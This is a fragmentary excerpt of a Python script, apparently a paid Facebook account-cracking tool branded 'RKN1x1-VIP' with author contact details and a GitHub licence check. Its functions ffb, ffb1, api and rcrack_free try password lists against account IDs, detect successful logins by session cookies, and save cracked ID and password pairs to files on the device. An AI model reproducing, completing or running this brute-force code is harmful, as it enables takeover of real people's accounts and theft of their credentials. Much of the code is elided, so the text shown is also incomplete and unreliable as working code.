#RKN(SAT ROKON YT)(SHAHI. ALAM)
#WhatsApp : 01619375101
#Github : babakhor123
from os import path
...
\033[0;92m╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
  ...
  os.system(f'xdg-open {tan}:https://www.facebook.com/profile.php?id=100085500825791')
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+8801619375101?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def ckx():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "→".join(uuid)
	server = requests.get(f'https://github.com/babakhor123/Approval.txt/blob/main/Paid.txt').text
	try:
		httpCaht = requests.get(f"https://github.com/babakhor123/Approval.txt/blob/main/Paid.txt").text
		if id in httpCaht:
			msg = str(os.geteuid())
			pass
		else:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [RKN1x1-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ROKON=session.cookies.get_dict().keys()
                        if "c_user" in ROKON:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [RKN-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/RKN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ROKON:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [RKN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/RKN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [RKN1x1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [RKN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/RKN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  ROKON, Sabbir, Forhad ')
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[RKN-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[RKN-CP] '+idf+' | '+ps+'\033[0;97m')
